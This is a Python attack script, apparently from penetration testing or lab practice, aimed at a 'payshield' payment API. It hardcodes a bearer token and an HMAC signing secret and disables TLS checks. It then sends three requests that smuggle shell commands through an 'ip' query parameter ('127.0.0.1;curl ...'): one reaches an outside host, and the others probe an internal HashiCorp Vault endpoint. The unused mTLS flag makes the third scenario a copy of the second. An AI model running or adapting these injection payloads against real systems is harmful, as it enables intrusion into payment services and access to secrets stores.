import requests
import time
import uuid
import hmac
import hashlib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
BASE_URL = "https://payshield.duckdns.org:8888"

TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJqbm1MNU1CQ3ZXelR2V2xaVFo0S0hXU0gwV2V5ZmhzaUduLVUwSkNmdWN3In0.eyJleHAiOjE3ODEwOTE3NTMsImlhdCI6MTc4MTA5MTQ1MywiYXV0aF90aW1lIjoxNzgxMDkxNDA0LCJqdGkiOiI0OGRlOTgzYi0zMDI5LTRhNWEtYTZkYy0wZTVhMDhjNzVkYTciLCJpc3MiOiJodHRwczovL3BheXNoaWVsZC5kdWNrZG5zLm9yZzo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiMzY4NmEwYTEtNGQ5NS00ZTEwLWI5ZGUtNzQ2ZTYxYmUwNGZhIiwidHlwIjoiQmVhcmVyIiwiYXpwIjoicGF5c2hpZWxkLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMDUzMDVhZi02NmY4LTQxZjQtOTBkOS0zNDUwZDI1MGY1NTgiLCJhY3IiOiIwIiwiYWxsb3dlZC1vcmlnaW5zIjpbIioiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwiZGVmYXVsdC1yb2xlcy1wYXlzaGllbGQtcmVhbG0iLCJ1bWFfYXV0aG9yaXphdGlvbiIsImVtcGxveWVlIl19LCJyZXNvdXJjZV9hY2Nlc3MiOnsiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInNpZCI6IjMwNTMwNWFmLTY2ZjgtNDFmNC05MGQ5LTM0NTBkMjUwZjU1OCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJlbXBsb3llZS1leGFtcGxlQHBheXNoaWVsZC5jb20iLCJlbWFpbCI6ImVtcGxveWVlLWV4YW1wbGVAcGF5c2hpZWxkLmNvbSJ9.PFJDtZJtfjBVjjhYtHdy0ZciXLaqafVjz9mBh_-m9vSYpDwUOu8pAYuApRDzNC1F61IqZjaHE8BMcBTm_-5Zyw"

SECRET = "gTPf9LYwK20ngQcRSd9mTiCxmXLKze7n"

def payload(method, uri, ts, nonce, token, secret):
    payload_str = f"{method}|{uri}|{ts}|{nonce}|{token}"
    return hmac.new(secret.encode(), payload_str.encode(), hashlib.sha256).hexdigest()

def send(label, method, uri, use_mtls=True, json_data=None):
    print(f"\n--- {label} ---")
    
    ts = str(int(time.time()))
    nonce = str(uuid.uuid4())
    sig = payload(method, uri, ts, nonce, TOKEN, SECRET)
    
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Timestamp": ts,
        "X-Nonce": nonce,
        "X-Signature": sig,
        "Content-Type": "application/json"
    }
    
    url = f"{BASE_URL}{uri}"
    print(f"Target: {method} {uri}")
    
    try:
        response = requests.request(method, url, headers=headers, json=json_data, verify=False, timeout=7)
        print(f"Status: {response.status_code}")
        preview = response.text[:150] + ("..." if len(response.text) > 150 else "")
        print(f"Response: {preview}")
        
        if response.status_code == 200 and len(response.text) > 0:
            print("[!] POTENTIAL SSRF VULNERABILITY CONFIRMED! <<<")
            
    except requests.exceptions.SSLError as e:
        print(f"❌ SSL Error: Khả năng cao do mTLS bị từ chối - {e}")
    except requests.exceptions.Timeout:
        print("❌ Error: Request Timed Out (Có thể mục tiêu nội bộ không phản hồi)")
    except Exception as e:
        print(f"❌ Error: {e}")

# SCENARIO 1: OOB SSRF 
send(
    label="SCENARIO 1: OOB SSRF", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -I https://google.com"
)

# SCENARIO 2: INTERNAL SERVICE 
send(
    label="SCENARIO 2: SSRF TO HASHICORP VAULT", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield.duckdns.org:8200/v1/sys/health"
)

# SCENARIO 3: SSRF WITHOUT mTLS 
send(
    label="SCENARIO 3: SSRF ATTEMPT WITHOUT mTLS", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield.duckdns.org:8200/v1/sys/health",
    use_mtls=False
)   